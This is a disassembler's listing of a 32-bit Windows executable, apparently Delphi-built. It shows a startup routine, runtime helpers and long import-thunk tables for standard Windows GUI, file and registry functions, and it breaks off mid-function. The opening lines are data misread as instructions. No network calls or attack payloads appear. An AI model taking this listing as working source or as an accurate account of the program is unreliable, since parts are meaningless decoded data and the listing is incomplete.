mov eax [ eax ]
call sub_46311c
call sub_403fa4
add [ eax + 0x30004277 ] bh
inc esi
inc esi
add ah dl
inc ebp
inc esi
add [ eax + 0x58004658 ] cl
pop eax
inc esi
add al ah
bound eax [ esi ]
mov al 0x62
inc esi
add al cl
mov [ esi ] es
cwde
mov [ esi ] es
adc al 0x1f
inc edi
add ah ah
push ds
inc edi
add al cl
imul eax [ edi ] sub_476998
sbb [ ebx + 0x47 ] ch
add al ch
push 0x47
add al bh
mov es [ edi ]
mov al [ 0x6800478e ]
dec ebp
dec eax
add [ eax ] bh
_start
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax sub_491988
call sub_405f5c
mov eax [ rw-data ]
mov eax [ eax ]
call sub_463084
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ r-xdata ]
call sub_46309c
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46311c
call sub_403fa4
sub_401177
add [ esp + 0x4 ] 0xfffffff8
jmp sub_4058b4
sub_401181
add [ esp + 0x4 ] 0xfffffff8
jmp sub_4058c8
ExitProcess
jmp [ ExitProcess@IAT ]
sub_401254
jmp [ __import_lookup_table_1(user32:MessageBoxA) ]
sub_40125c
jmp [ __import_lookup_table_0(kernel32:FindClose) ]
sub_401264
jmp [ __import_lookup_table_0(kernel32:FindFirstFileA) ]
sub_40126c
jmp [ __import_lookup_table_0(kernel32:FreeLibrary) ]
GetCommandLineA
jmp [ GetCommandLineA@IAT ]
sub_40127c
jmp [ __import_lookup_table_0(kernel32:GetLocaleInfoA) ]
sub_401284
jmp [ __import_lookup_table_0(kernel32:GetModuleFileNameA) ]
sub_40128c
jmp [ __import_lookup_table_0(kernel32:GetModuleHandleA) ]
sub_401294
jmp [ __import_lookup_table_0(kernel32:GetProcAddress) ]
GetStartupInfoA
jmp [ __import_lookup_table_0(kernel32:GetStartupInfoA) ]
sub_4012b4
jmp [ __import_lookup_table_1(user32:LoadStringA) ]
MultiByteToWideChar
jmp [ MultiByteToWideChar@IAT ]
sub_4012d4
jmp [ __import_lookup_table_2(advapi32:RegCloseKey) ]
WideCharToMultiByte
jmp [ WideCharToMultiByte@IAT ]
sub_4012f4
jmp [ __import_lookup_table_0(kernel32:VirtualQuery) ]
SysAllocStringLen
jmp [ SysAllocStringLen@IAT ]
SysReAllocStringLen
jmp [ SysReAllocStringLen@IAT ]
SysFreeString
jmp [ SysFreeString@IAT ]
InterlockedIncrement
jmp [ InterlockedIncrement@IAT ]
InterlockedDecrement
jmp [ InterlockedDecrement@IAT ]
sub_401324
jmp [ __import_lookup_table_0(kernel32:GetCurrentThreadId) ]
QueryPerformanceCounter
jmp [ QueryPerformanceCounter@IAT ]
sub_40133c
jmp [ __import_lookup_table_0(kernel32:GetTickCount) ]
sub_401344
push ebx
add esp 0xffffffbc
mov ebx 0xa
push esp
call GetStartupInfoA
test [ esp + 0x2c ] 0x1
je r-xdata
mov eax ebx
add esp 0x44
pop ebx
retn
movzx ebx [ esp + 0x30 ]
sub_401368
jmp [ __import_lookup_table_0(kernel32:LocalAlloc) ]
sub_401380
jmp [ __import_lookup_table_0(kernel32:VirtualFree) ]
sub_401388
jmp [ __import_lookup_table_0(kernel32:InitializeCriticalSection) ]
sub_401390
jmp [ __import_lookup_table_0(kernel32:EnterCriticalSection) ]
sub_401398
jmp [ __import_lookup_table_0(kernel32:LeaveCriticalSection) ]
sub_4013a0
jmp [ __import_lookup_table_0(kernel32:DeleteCriticalSection) ]
sub_401aea
jmp sub_403a98
sub_401af1
mov al [ rw-data ]
pop ebp
retn
sub_401bce
jmp sub_403a98
sub_401c9c
inc [ rw-data ]
mov edx eax
sub edx 0x4
mov edx [ edx ]
and edx 0x7ffffffc
sub edx 0x4
add [ rw-data ] edx
call sub_4022b0
retn
sub_40229c
jmp sub_403a98
sub_402442
jmp sub_403a98
sub_4026e1
jmp sub_403a98
sub_4027a4
call sub_405f10
cmp [ eax ] 0x0
je r-xdata
xor eax eax
retn
call sub_405f10
mov eax [ eax ]
mov eax [ eax + 0x4 ]
retn
sub_4027f8
mov [ rw-data ] edx
call sub_40407c
sub_40285c
push eax
push edx
push ecx
call sub_405f10
cmp [ eax + 0x4 ] 0x0
pop ecx
pop edx
pop eax
jne r-xdata
xor eax eax
jmp sub_402850
retn
sub_402878
retn
sub_4028cc
retn
sub_4028d0
push ebx
call sub_405f10
mov ebx [ eax + 0x4 ]
call sub_405f10
xor edx edx
mov [ eax + 0x4 ] edx
mov eax ebx
pop ebx
retn
sub_402ab0
mov [ rw-data ] ax
fnclex
fldcw [ rw-data ]
retn
sub_402ac0
push 0x0
fnstcw [ esp ]
pop eax
retn
sub_402b94
mov edx [ eax + 0x1c ]
call sub_402b4c
retn
sub_402c27
retn
sub_402c28
xor ecx ecx
mov cl [ edx ]
inc ecx
xchg edx eax
call sub_4028f0
retn
sub_402d64
push ebx
xor ebx ebx
imul edx [ ebx + rw-data ] 0x8088405
inc edx
mov [ ebx + rw-data ] edx
mul edx
mov eax edx
pop ebx
retn
sub_402e54
mov ecx 0xff
call sub_402e60
retn
sub_402e84
push esi
push edi
mov esi eax
mov edi edx
and ecx 0xff
[ esi ] [ edi ]
pop edi
pop esi
retn
j_sub_402ea0
jmp sub_402ea0
sub_402e9d
retn
sub_403181
0xc37b
sub_40322d
jmp sub_403a98
sub_403280
fninit
fwait
fldcw [ rw-data ]
retn
sub_4032d0
mov eax [ eax - 0x24 ]
test eax eax
je r-xdata
retn
mov eax [ eax ]
sub_4032dc
push ebx
mov ebx eax
mov eax ebx
call sub_40330c
call sub_4026f4
mov edx eax
mov eax ebx
call sub_403350
pop ebx
retn
sub_4032f8
push ebx
mov ebx eax
mov eax ebx
call sub_4033a8
mov eax ebx
call sub_402714
pop ebx
retn
sub_40330c
add eax 0xffffffd8
mov eax [ eax ]
retn
sub_403334
call sub_4036d0
test dl dl
jle r-xdata
retn
call sub_4036b8
sub_4033f4
retn
sub_40347c
jmp sub_403a98
sub_403483
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_40358c
mov eax 0x8000ffff
retn
sub_403594
retn
sub_403598
retn
sub_40359c
retn
sub_403691
jmp sub_4037e4
sub_403696
mov eax [ esp + 0x2c ]
mov eax [ eax + 0xc ]
test eax eax
je r-xdata
call sub_403af8
retn
mov ecx [ eax ]
mov dl 0x81
push eax
call [ ecx - 0x4 ]
pop eax
call sub_4036b8
sub_4036b8
mov edx [ eax ]
call [ edx - 0x8 ]
retn
sub_4036c0
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx - 0x1c ]
mov eax ebx
pop ebx
retn
sub_4036d0
test dl dl
jg r-xdata
push eax
push edx
mov edx [ eax ]
call [ edx - 0x18 ]
pop edx
pop eax
retn
retn
sub_4036e0
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push 0x0
push 0x0
push 0x0
push 0xeedfadf
call [ rw-data ]
sub_4037a8
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push edx
push esp
push 0x1
push 0x0
push 0xeedfae2
call [ rw-data ]
pop edx
sub_4037c4
push eax
push edx
cmp [ rw-data ] 0x1
jbe r-xdata
pop edx
pop eax
retn
push esp
push 0x2
push 0x0
push 0xeedfae3
call [ rw-data ]
sub_403b91
retn
sub_403cd4
xor edx edx
lea eax [ ebp - 0xc ]
mov ecx [ fs : edx ]
mov [ fs : edx ] eax
mov [ eax ] ecx
mov [ eax + 0x4 ] r-xdata
mov [ eax + 0x8 ] ebp
mov [ rw-data ] eax
retn
sub_403d62
jmp sub_4037e4
sub_403dc2
jmp sub_4037e4
sub_403ddc
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] edx
mov eax [ edx + 0x4 ]
mov [ rw-data ] eax
call sub_403cd4
mov [ rw-data ] 0x0
call sub_403d7c
retn
sub_403f15
retn
sub_404077
pop ebp
pop edi
pop esi
pop ebx
retn
sub_40407c
mov [ rw-data ] eax
call sub_403fa4
sub_4042b8
retn
sub_4042f4
retn
sub_404302
retn
sub_40431b
retn
sub_40432c
retn
sub_404413
retn
sub_404544
test eax eax
je r-xdata
retn
mov edx [ eax - 0x8 ]
inc edx
jle r-xdata
[ eax - 0x8 ]
j_sub_404560
jmp sub_404560
sub_4045a9
retn
sub_4045b1
retn
sub_4045f3
retn
sub_40474c
test eax eax
je r-xdata
retn
push eax
push 0x0
call SysAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_402850
sub_404764
xchg [ eax ] edx
test edx edx
je r-xdata
retn
push edx
call SysFreeString
sub_4048bc
retn
sub_4048ce
retn
sub_4048d0
test eax eax
je r-xdata
mov eax r-xdata
retn
retn
sub_404ac4
mov ecx 0x1
jmp sub_404a30
sub_404ace
retn
sub_404b04
cmp [ rw-data ] 0x0
je r-xdata
mov al 0x10
call sub_402850
call [ rw-data ]
retn
sub_404c08
mov ecx 0x1
jmp sub_404b1c
sub_404c12
retn
sub_404c14
cmp [ rw-data ] 0x0
je r-xdata
mov al 0x10
call sub_402850
call [ rw-data ]
retn
sub_404e3a
retn
sub_404e3c
push edx
call sub_4026f4
pop edx
test eax eax
je r-xdata
retn
push eax
call sub_404ac4
pop eax
sub_404e50
push eax
call sub_404c08
pop eax
call sub_402714
retn
sub_404e60
mov al 0x11
jmp sub_402850
sub_404e8b
retn
sub_404f04
retn
sub_404f18
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_404d48
pop ebp
retn 0x4
j_sub_404b1c
jmp sub_404b1c
sub_404f2d
retn
sub_404f30
call sub_4050d0
retn
sub_40515c
call sub_405134
retn
sub_4054a5
jmp sub_403a98
sub_405610
call sub_405620
retn
sub_405618
call sub_405648
retn
sub_405674
call sub_405684
retn
sub_40567c
call sub_4056a4
retn
sub_405684
push ebx
mov ebx eax
mov eax 0x8
call sub_4026f4
mov edx [ rw-data ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ rw-data ] eax
pop ebx
retn
sub_40573f
jmp sub_4037e4
sub_405760
mov edx [ rw-data ]
mov [ eax ] edx
mov [ rw-data ] eax
retn
sub_4057d4
jmp sub_403a98
sub_4057db
pop ecx
pop ebp
retn
sub_405854
test eax eax
je r-xdata
retn
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
sub_405860
add eax 0x4
push eax
call InterlockedDecrement
retn
sub_40586c
cmp [ eax + 0x4 ] 0x0
je r-xdata
retn
mov al 0x2
call sub_402850
sub_40587c
call sub_4032dc
mov [ eax + 0x4 ] 0x1
retn
sub_4058b4
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add eax 0x4
push eax
call InterlockedIncrement
pop ebp
retn 0x4
sub_405ba3
jmp sub_403a98
sub_405baa
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_405c47
jmp sub_403a98
sub_405c4e
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_405c97
jmp sub_403a98
sub_405c9e
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_405d62
jmp sub_403a98
sub_405d69
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_405dba
jmp sub_403a98
sub_405dc1
pop ebp
retn
sub_405e98
jmp [ __import_lookup_table_4(kernel32:GetModuleHandleA) ]
LocalAlloc
jmp [ LocalAlloc@IAT ]
TlsSetValue
jmp [ TlsSetValue@IAT ]
sub_405eb8
push eax
push 0x40
call LocalAlloc
retn
sub_405ec4
mov eax 0x10
retn
sub_405f50
mov eax rw-data
call sub_405760
retn
sub_405fc5
jmp sub_403a98
sub_405fcc
pop ebp
retn
sub_405fd0
sub [ rw-data ] 0x1
retn
sub_405fd8
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] edx
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx + 0x8 ] ecx
pop ebx
pop ebp
retn 0x8
sub_405ff4
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
retn
sub_40603d
jmp sub_403a98
sub_406044
pop ebp
retn
sub_406048
sub [ rw-data ] 0x1
retn
RegCloseKey
jmp [ __import_lookup_table_5(advapi32:RegCloseKey) ]
RegOpenKeyExA
jmp [ RegOpenKeyExA@IAT ]
RegQueryValueExA
jmp [ __import_lookup_table_5(advapi32:RegQueryValueExA) ]
CompareStringA
jmp [ CompareStringA@IAT ]
CreateFileA
jmp [ __import_lookup_table_6(kernel32:CreateFileA) ]
CreateThread
jmp [ __import_lookup_table_6(kernel32:CreateThread) ]
FileTimeToDosDateTime
jmp [ __import_lookup_table_6(kernel32:FileTimeToDosDateTime) ]
FileTimeToLocalFileTime
jmp [ __import_lookup_table_6(kernel32:FileTimeToLocalFileTime) ]
FindClose
jmp [ FindClose@IAT ]
FindFirstFileA
jmp [ __import_lookup_table_6(kernel32:FindFirstFileA) ]
FindResourceA
jmp [ __import_lookup_table_6(kernel32:FindResourceA) ]
FormatMessageA
jmp [ __import_lookup_table_6(kernel32:FormatMessageA) ]
InterlockedExchange
jmp [ InterlockedExchange@IAT ]
FreeResource
jmp [ __import_lookup_table_6(kernel32:FreeResource) ]
GetACP
jmp [ __import_lookup_table_6(kernel32:GetACP) ]
GetCPInfo
jmp [ GetCPInfo@IAT ]
GetCurrentProcessId
jmp [ __import_lookup_table_6(kernel32:GetCurrentProcessId) ]
GetDateFormatA
jmp [ __import_lookup_table_6(kernel32:GetDateFormatA) ]
GetDiskFreeSpaceA
jmp [ __import_lookup_table_6(kernel32:GetDiskFreeSpaceA) ]
GetFileAttributesA
jmp [ __import_lookup_table_6(kernel32:GetFileAttributesA) ]
GetFullPathNameA
jmp [ GetFullPathNameA@IAT ]
GetLocalTime
jmp [ GetLocalTime@IAT ]
GetLocaleInfoA
jmp [ GetLocaleInfoA@IAT ]
GetModuleHandleA
jmp [ GetModuleHandleA@IAT ]
GetProfileStringA
jmp [ __import_lookup_table_6(kernel32:GetProfileStringA) ]
GetStringTypeExA
jmp [ __import_lookup_table_6(kernel32:GetStringTypeExA) ]
GetSystemInfo
jmp [ __import_lookup_table_6(kernel32:GetSystemInfo) ]
GetVersion
jmp [ __import_lookup_table_6(kernel32:GetVersion) ]
GetVersionExA
jmp [ GetVersionExA@IAT ]
GlobalAlloc
jmp [ __import_lookup_table_6(kernel32:GlobalAlloc) ]
GlobalFindAtomA
jmp [ __import_lookup_table_6(kernel32:GlobalFindAtomA) ]
GlobalHandle
jmp [ __import_lookup_table_6(kernel32:GlobalHandle) ]
GlobalReAlloc
jmp [ GlobalReAlloc@IAT ]
GlobalSize
jmp [ __import_lookup_table_6(kernel32:GlobalSize) ]
LeaveCriticalSection
jmp [ __import_lookup_table_6(kernel32:LeaveCriticalSection) ]
LoadLibraryA
jmp [ LoadLibraryA@IAT ]
LoadResource
jmp [ __import_lookup_table_6(kernel32:LoadResource) ]
LockResource
jmp [ __import_lookup_table_6(kernel32:LockResource) ]
ReadFile
jmp [ __import_lookup_table_6(kernel32:ReadFile) ]
ResetEvent
jmp [ ResetEvent@IAT ]
SetEndOfFile
jmp [ __import_lookup_table_6(kernel32:SetEndOfFile) ]
SetEvent
jmp [ __import_lookup_table_6(kernel32:SetEvent) ]
SetFilePointer
jmp [ SetFilePointer@IAT ]
SetThreadLocale
jmp [ __import_lookup_table_6(kernel32:SetThreadLocale) ]
SizeofResource
jmp [ __import_lookup_table_6(kernel32:SizeofResource) ]
sub_40632c
jmp [ __import_lookup_table_6(kernel32:Sleep) ]
VirtualAlloc
jmp [ VirtualAlloc@IAT ]
VirtualFree
jmp [ __import_lookup_table_6(kernel32:VirtualFree) ]
VirtualProtect
jmp [ __import_lookup_table_6(kernel32:VirtualProtect) ]
VirtualQuery
jmp [ __import_lookup_table_6(kernel32:VirtualQuery) ]
WaitForSingleObject
jmp [ __import_lookup_table_6(kernel32:WaitForSingleObject) ]
lstrcpyA
jmp [ __import_lookup_table_6(kernel32:lstrcpyA) ]
GetFileVersionInfoA
jmp [ GetFileVersionInfoA@IAT ]
GetFileVersionInfoSizeA
jmp [ GetFileVersionInfoSizeA@IAT ]
VerQueryValueA
jmp [ __import_lookup_table_7(version:VerQueryValueA) ]
Arc
jmp [ Arc@IAT ]
CopyEnhMetaFileA
jmp [ CopyEnhMetaFileA@IAT ]
CreateBitmap
jmp [ CreateBitmap@IAT ]
CreateBrushIndirect
jmp [ __import_lookup_table_8(gdi32:CreateBrushIndirect) ]
CreateDIBSection
jmp [ CreateDIBSection@IAT ]
CreateDIBitmap
jmp [ CreateDIBitmap@IAT ]
CreateHalftonePalette
jmp [ __import_lookup_table_8(gdi32:CreateHalftonePalette) ]
CreatePalette
jmp [ __import_lookup_table_8(gdi32:CreatePalette) ]
CreatePenIndirect
jmp [ __import_lookup_table_8(gdi32:CreatePenIndirect) ]
CreatePolygonRgn
jmp [ __import_lookup_table_8(gdi32:CreatePolygonRgn) ]
CreateRectRgn
jmp [ __import_lookup_table_8(gdi32:CreateRectRgn) ]
DeleteEnhMetaFile
jmp [ DeleteEnhMetaFile@IAT ]
EndDoc
jmp [ EndDoc@IAT ]
EndPage
jmp [ EndPage@IAT ]
ExcludeClipRect
jmp [ ExcludeClipRect@IAT ]
ExtCreatePen
jmp [ ExtCreatePen@IAT ]
ExtSelectClipRgn
jmp [ ExtSelectClipRgn@IAT ]
ExtTextOutA
jmp [ ExtTextOutA@IAT ]
GetBkColor
jmp [ GetBkColor@IAT ]
GetBkMode
jmp [ GetBkMode@IAT ]
GetBrushOrgEx
jmp [ GetBrushOrgEx@IAT ]
GetClipBox
jmp [ GetClipBox@IAT ]
GetCurrentPositionEx
jmp [ GetCurrentPositionEx@IAT ]
GetDCOrgEx
jmp [ GetDCOrgEx@IAT ]
GetDIBColorTable
jmp [ GetDIBColorTable@IAT ]
GetEnhMetaFileHeader
jmp [ GetEnhMetaFileHeader@IAT ]
GetPixel
jmp [ __import_lookup_table_8(gdi32:GetPixel) ]
GetTextAlign
jmp [ __import_lookup_table_8(gdi32:GetTextAlign) ]
GetTextExtentPoint32A
jmp [ __import_lookup_table_8(gdi32:GetTextExtentPoint32A) ]
GetWindowOrgEx
jmp [ __import_lookup_table_8(gdi32:GetWindowOrgEx) ]
LPtoDP
jmp [ LPtoDP@IAT ]
LineTo
jmp [ LineTo@IAT ]
MaskBlt
jmp [ MaskBlt@IAT ]
MoveToEx
jmp [ MoveToEx@IAT ]
Pie
jmp [ Pie@IAT ]
PlayEnhMetaFile
jmp [ __import_lookup_table_8(gdi32:PlayEnhMetaFile) ]
PolyPolyline
jmp [ __import_lookup_table_8(gdi32:PolyPolyline) ]
RectVisible
jmp [ RectVisible@IAT ]
Rectangle
jmp [ Rectangle@IAT ]
RoundRect
jmp [ RoundRect@IAT ]
SelectClipRgn
jmp [ __import_lookup_table_8(gdi32:SelectClipRgn) ]
SetBrushOrgEx
jmp [ __import_lookup_table_8(gdi32:SetBrushOrgEx) ]
SetDIBColorTable
jmp [ __import_lookup_table_8(gdi32:SetDIBColorTable) ]
SetEnhMetaFileBits
jmp [ __import_lookup_table_8(gdi32:SetEnhMetaFileBits) ]
SetPixel
jmp [ __import_lookup_table_8(gdi32:SetPixel) ]
SetROP2
jmp [ SetROP2@IAT ]
SetTextAlign
jmp [ SetTextAlign@IAT ]
SetViewportOrgEx
jmp [ SetViewportOrgEx@IAT ]
TextOutA
jmp [ TextOutA@IAT ]
UnrealizeObject
jmp [ UnrealizeObject@IAT ]
ActivateKeyboardLayout
jmp [ ActivateKeyboardLayout@IAT ]
AdjustWindowRectEx
jmp [ AdjustWindowRectEx@IAT ]
CharLowerA
jmp [ __import_lookup_table_9(user32:CharLowerA) ]
BeginDeferWindowPos
jmp [ __import_lookup_table_9(user32:BeginDeferWindowPos) ]
BeginPaint
jmp [ __import_lookup_table_9(user32:BeginPaint) ]
BringWindowToTop
jmp [ __import_lookup_table_9(user32:BringWindowToTop) ]
CallNextHookEx
jmp [ __import_lookup_table_9(user32:CallNextHookEx) ]
CallWindowProcA
jmp [ __import_lookup_table_9(user32:CallWindowProcA) ]
CharLowerBuffA
jmp [ __import_lookup_table_9(user32:CharLowerBuffA) ]
CharNextA
jmp [ __import_lookup_table_9(user32:CharNextA) ]
CharToOemA
jmp [ __import_lookup_table_9(user32:CharToOemA) ]
CharUpperBuffA
jmp [ __import_lookup_table_9(user32:CharUpperBuffA) ]
CheckMenuItem
jmp [ __import_lookup_table_9(user32:CheckMenuItem) ]
ClientToScreen
jmp [ __import_lookup_table_9(user32:ClientToScreen) ]
CloseClipboard
jmp [ __import_lookup_table_9(user32:CloseClipboard) ]
CreateIcon
jmp [ __import_lookup_table_9(user32:CreateIcon) ]
CreateMDIWindowA
jmp [ __import_lookup_table_9(user32:CreateMDIWindowA) ]
CreateMenu
jmp [ __import_lookup_table_9(user32:CreateMenu) ]
CreatePopupMenu
jmp [ __import_lookup_table_9(user32:CreatePopupMenu) ]
DefFrameProcA
jmp [ DefFrameProcA@IAT ]
DefWindowProcA
jmp [ DefWindowProcA@IAT ]
DeferWindowPos
jmp [ DeferWindowPos@IAT ]
DestroyIcon
jmp [ DestroyIcon@IAT ]
DestroyMenu
jmp [ DestroyMenu@IAT ]
DestroyWindow
jmp [ DestroyWindow@IAT ]
DispatchMessageA
jmp [ __import_lookup_table_9(user32:DispatchMessageA) ]
DrawFrameControl
jmp [ DrawFrameControl@IAT ]
DrawIcon
jmp [ DrawIcon@IAT ]
DrawIconEx
jmp [ DrawIconEx@IAT ]
DrawMenuBar
jmp [ __import_lookup_table_9(user32:DrawMenuBar) ]
EmptyClipboard
jmp [ __import_lookup_table_9(user32:EmptyClipboard) ]
EnableWindow
jmp [ __import_lookup_table_9(user32:EnableWindow) ]
EndDeferWindowPos
jmp [ __import_lookup_table_9(user32:EndDeferWindowPos) ]
EndPaint
jmp [ __import_lookup_table_9(user32:EndPaint) ]
EnumThreadWindows
jmp [ __import_lookup_table_9(user32:EnumThreadWindows) ]
EnumWindows
jmp [ EnumWindows@IAT ]
EqualRect
jmp [ EqualRect@IAT ]
FindWindowA
jmp [ FindWindowA@IAT ]
GetCaretPos
jmp [ GetCaretPos@IAT ]
GetClassNameA
jmp [ __import_lookup_table_9(user32:GetClassNameA) ]
GetClientRect
jmp [ GetClientRect@IAT ]
GetCursor
jmp [ __import_lookup_table_9(user32:GetCursor) ]
GetCursorPos
jmp [ GetCursorPos@IAT ]
GetDC
jmp [ __import_lookup_table_9(user32:GetDC) ]
GetDCEx
jmp [ __import_lookup_table_9(user32:GetDCEx) ]
GetDlgItem
jmp [ __import_lookup_table_9(user32:GetDlgItem) ]
GetDoubleClickTime
jmp [ __import_lookup_table_9(user32:GetDoubleClickTime) ]
GetForegroundWindow
jmp [ GetForegroundWindow@IAT ]
GetIconInfo
jmp [ GetIconInfo@IAT ]
GetKeyNameTextA
jmp [ __import_lookup_table_9(user32:GetKeyNameTextA) ]
GetKeyboardLayout
jmp [ GetKeyboardLayout@IAT ]
GetKeyboardLayoutList
jmp [ GetKeyboardLayoutList@IAT ]
GetKeyboardState
jmp [ GetKeyboardState@IAT ]
GetLastActivePopup
jmp [ GetLastActivePopup@IAT ]
GetLastInputInfo
jmp [ __import_lookup_table_9(user32:GetLastInputInfo) ]
GetMenu
jmp [ GetMenu@IAT ]
GetMenuItemInfoA
jmp [ __import_lookup_table_9(user32:GetMenuItemInfoA) ]
GetMenuStringA
jmp [ __import_lookup_table_9(user32:GetMenuStringA) ]
GetMessageTime
jmp [ __import_lookup_table_9(user32:GetMessageTime) ]
__imp_GetWindow
jmp [ GetWindow@IAT ]
GetParent
jmp [ GetParent@IAT ]
GetPropA
jmp [ GetPropA@IAT ]
GetScrollInfo
jmp [ __import_lookup_table_9(user32:GetScrollInfo) ]
GetScrollPos
jmp [ GetScrollPos@IAT ]
GetScrollRange
jmp [ GetScrollRange@IAT ]
GetSubMenu
jmp [ __import_lookup_table_9(user32:GetSubMenu) ]
GetSysColor
jmp [ __import_lookup_table_9(user32:GetSysColor) ]
GetSysColorBrush
jmp [ __import_lookup_table_9(user32:GetSysColorBrush) ]
GetSystemMenu
jmp [ __import_lookup_table_9(user32:GetSystemMenu) ]
GetTopWindow
jmp [ GetTopWindow@IAT ]
GetWindow
jmp [ GetWindow@IAT ]
GetWindowDC
jmp [ GetWindowDC@IAT ]
GetWindowPlacement
jmp [ __import_lookup_table_9(user32:GetWindowPlacement) ]
GetWindowRect
jmp [ __import_lookup_table_9(user32:GetWindowRect) ]
GetWindowTextA
jmp [ GetWindowTextA@IAT ]
__imp_GetWindowThreadProcessId
jmp [ __import_lookup_table_9(user32:GetWindowThreadProcessId) ]
GetWindowThreadProcessId
jmp [ __import_lookup_table_9(user32:GetWindowThreadProcessId) ]
InsertMenuItemA
jmp [ __import_lookup_table_9(user32:InsertMenuItemA) ]
IsCharAlphaNumericA
jmp [ __import_lookup_table_9(user32:IsCharAlphaNumericA) ]
IsChild
jmp [ __import_lookup_table_9(user32:IsChild) ]
IsDialogMessageA
jmp [ IsDialogMessageA@IAT ]
IsRectEmpty
jmp [ IsRectEmpty@IAT ]
IsWindow
jmp [ __import_lookup_table_9(user32:IsWindow) ]
IsWindowEnabled
jmp [ __import_lookup_table_9(user32:IsWindowEnabled) ]
IsZoomed
jmp [ IsZoomed@IAT ]
LoadBitmapA
jmp [ __import_lookup_table_9(user32:LoadBitmapA) ]
LoadIconA
jmp [ __import_lookup_table_9(user32:LoadIconA) ]
LoadStringA
jmp [ LoadStringA@IAT ]
MapVirtualKeyA
jmp [ __import_lookup_table_9(user32:MapVirtualKeyA) ]
MessageBeep
jmp [ __import_lookup_table_9(user32:MessageBeep) ]
MessageBoxA
jmp [ MessageBoxA@IAT ]
OemToCharA
jmp [ OemToCharA@IAT ]
OpenClipboard
jmp [ OpenClipboard@IAT ]
PeekMessageA
jmp [ __import_lookup_table_9(user32:PeekMessageA) ]
PostQuitMessage
jmp [ __import_lookup_table_9(user32:PostQuitMessage) ]
PtInRect
jmp [ __import_lookup_table_9(user32:PtInRect) ]
RedrawWindow
jmp [ __import_lookup_table_9(user32:RedrawWindow) ]
RegisterClassA
jmp [ __import_lookup_table_9(user32:RegisterClassA) ]
RegisterClipboardFormatA
jmp [ __import_lookup_table_9(user32:RegisterClipboardFormatA) ]
ReleaseCapture
jmp [ ReleaseCapture@IAT ]
ReleaseDC
jmp [ ReleaseDC@IAT ]
RemoveMenu
jmp [ RemoveMenu@IAT ]
ScrollWindow
jmp [ __import_lookup_table_9(user32:ScrollWindow) ]
SetActiveWindow
jmp [ __import_lookup_table_9(user32:SetActiveWindow) ]
SetCapture
jmp [ __import_lookup_table_9(user32:SetCapture) ]
SetClassLongA
jmp [ __import_lookup_table_9(user32:SetClassLongA) ]
SetForegroundWindow
jmp [ SetForegroundWindow@IAT ]
SetKeyboardState
jmp [ __import_lookup_table_9(user32:SetKeyboardState) ]
SetMenuItemInfoA
jmp [ SetMenuItemInfoA@IAT ]
SetParent
jmp [ __import_lookup_table_9(user32:SetParent) ]
SetScrollInfo
jmp [ __import_lookup_table_9(user32:SetScrollInfo) ]
SetWindowPlacement
jmp [ SetWindowPlacement@IAT ]
SetWindowTextA
jmp [ SetWindowTextA@IAT ]
SetWindowsHookExA
jmp [ __import_lookup_table_9(user32:SetWindowsHookExA) ]
ShowCursor
jmp [ __import_lookup_table_9(user32:ShowCursor) ]
ShowOwnedPopups
jmp [ __import_lookup_table_9(user32:ShowOwnedPopups) ]
TrackPopupMenu
jmp [ TrackPopupMenu@IAT ]
TranslateMDISysAccel
jmp [ TranslateMDISysAccel@IAT ]
TranslateMessage
jmp [ TranslateMessage@IAT ]
UnhookWindowsHookEx
jmp [ __import_lookup_table_9(user32:UnhookWindowsHookEx) ]
UnionRect
jmp [ __import_lookup_table_9(user32:UnionRect) ]
UnregisterClassA
jmp [ __import_lookup_table_9(user32:UnregisterClassA) ]
UpdateWindow
jmp [ __import_lookup_table_9(user32:UpdateWindow) ]
WaitMessage
jmp [ WaitMessage@IAT ]
WinHelpA
jmp [ WinHelpA@IAT ]
WindowFromPoint
jmp [ __import_lookup_table_9(user32:WindowFromPoint) ]
sub_406c10
call GetTickCount
retn
sub_406c18
xor eax eax
retn
sub_406c1c
push edx
push eax
call GlobalAlloc
push eax
call GlobalLock
retn
sub_406c2c
push ecx
push edx
push eax
call GlobalHandle
push eax
push eax
call GlobalUnlock
call GlobalReAlloc
push eax
call GlobalLock
retn
sub_406c48
push eax
call GlobalHandle
push eax
push eax
call GlobalUnlock
call GlobalFree
retn
sub_406c5c
shl edx 0x8
and edx 0xff000000
or eax edx
retn
sub_406c68
and eax 0xff
and edx 0xff
shl edx 0x8
or eax edx
xor edx edx
mov dl cl
shl edx 0x10
or eax edx
retn
sub_406cbc
call sub_406c04
retn
CreateWindowExA
jmp [ __import_lookup_table_9(user32:CreateWindowExA) ]
sub_406e99
jmp sub_403a98
sub_406ea0
pop ebp
retn
sub_406ea4
sub [ rw-data ] 0x1
retn
sub_406ed1
jmp sub_403a98
sub_406ed8
pop ebp
retn
sub_406edc
sub [ rw-data ] 0x1
retn
sub_4071f1
jmp sub_403a98
sub_4071f8
pop ebp
retn
sub_4071fc
sub [ rw-data ] 0x1
retn
sub_407ced
add eax 0xffffffd4
jmp sub_40d638
sub_407cf5
add eax 0xffffffd4
jmp sub_40d4e0
sub_407cfd
add eax 0xffffffd4
jmp sub_40d57c
sub_407d0f
add [ esp + 0x4 ] 0xffffffd4
jmp sub_4058b4
sub_407d19
add [ esp + 0x4 ] 0xffffffd4
jmp sub_4058c8
sub_407df0
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
